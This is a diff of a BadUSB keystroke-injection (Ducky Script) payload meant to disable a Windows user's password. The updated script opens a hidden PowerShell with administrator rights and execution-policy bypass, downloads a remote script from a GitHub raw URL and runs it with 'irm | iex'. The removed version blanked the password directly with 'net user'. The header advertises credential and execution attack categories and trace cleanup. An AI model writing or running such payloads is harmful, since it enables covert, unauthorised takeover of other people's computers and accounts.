@@ -1,44 +1,47 @@
-REM This script allows you to disable Windows password
+REM                      _                        
+REM  _   _  ___  _   _  | | ___ __   _____      __
+REM | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
+REM | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
+REM  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
+REM  |___/                                        
+
+REM #######################################################
+REM #                                                     |
+REM # Title        : BadUSB_windowsPassDisabler           |
+REM # Author       : you.know                             |
+REM # Version      : 2.0                                  |
+REM # Category     : Exfiltration, Credentials, Execution |
+REM # Target       : Windows 7/8/10/11                    |
+REM # Details      : Opens powershell hidden, disables    |
+REM #                windows password. Then it cleans up  |
+REM #                traces                               |
+REM #                                                     |
+REM #######################################################
+
+REM Initial delay to ensure the system is ready
 DELAY 2500
-REM Minimize all apps
+
+REM Minimize all active windows
 GUI d
 DELAY 500
-REM Start powershell as admin
+
+REM Open Run dialog
 GUI r
 DELAY 500
-STRING powershell.exe -windowstyle hidden
-DELAY 200
-CTRL SHIFT ENTER
-DELAY 2000
+
+REM Execute PowerShell hidden with administrative privileges
+STRING powershell -w h -NoP -Ep Bypass -Command "irm https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_windowsPassDisabler/refs/heads/main/script.ps1 | iex"
+CTRL-SHIFT ENTER
+DELAY 1000
 LEFT
-DELAY 150
+DELAY 500
 ENTER
-DELAY 2000
-REM Disable Windows password
-STRING net user $env:USERNAME *
-ENTER
-DELAY 150
-ENTER
-DELAY 150
-ENTER
-DELAY 200
-REM Exit from powershell
-STRING exit
-ENTER
-REM Make capslock flash to know when you can unplug the BadUSB
+
+REM Flash CAPSLOCK as an indicator that execution is complete
 CAPSLOCK
-DELAY 150
+DELAY 500
 CAPSLOCK
-DELAY 150
+DELAY 500
 CAPSLOCK
-DELAY 150
+DELAY 500
 CAPSLOCK
-DELAY 2000
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-DELAY 150
-CAPSLOCK
-REM End of payload
